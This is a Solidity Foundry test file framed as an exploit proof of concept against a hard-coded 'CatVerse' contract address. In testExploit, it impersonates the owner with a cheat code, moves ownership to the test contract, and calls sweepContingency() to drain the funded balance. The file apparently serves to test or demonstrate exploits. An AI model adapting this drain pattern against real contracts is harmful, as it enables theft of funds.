pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICatVerse {
    function getOwner() external view returns (address);
    function _hasLiqBeenAdded() external view returns (bool);
    function transferOwner(address newOwner) external;
    function sweepContingency() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x89031AaFA457245469E9641387aa94BFB51cB964;
    address attacker = address(this);
    ICatVerse internal target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICatVerse(TARGET);
        // Fund the target contract with 10 ether.
        deal(TARGET, 10 ether);
        // Assert that the contract has the funds.
        assertEq(address(TARGET).balance, 10 ether);
        // Verify the precondition that liquidity has not been added.
        assertEq(target._hasLiqBeenAdded(), false);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // The attacker needs to be the owner to call the vulnerable function.
        // First, get the current owner of the contract.
        address originalOwner = target.getOwner();
        vm.label(originalOwner, "Original Owner");

        // Impersonate the original owner to transfer ownership to our exploit contract.
        vm.startPrank(originalOwner);
        target.transferOwner(attacker);
        vm.stopPrank();

        // Verify that the attacker is now the owner.
        assertEq(target.getOwner(), attacker);

        // As the new owner, call sweepContingency() to drain the contract's BNB balance.
        vm.prank(attacker);
        target.sweepContingency();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

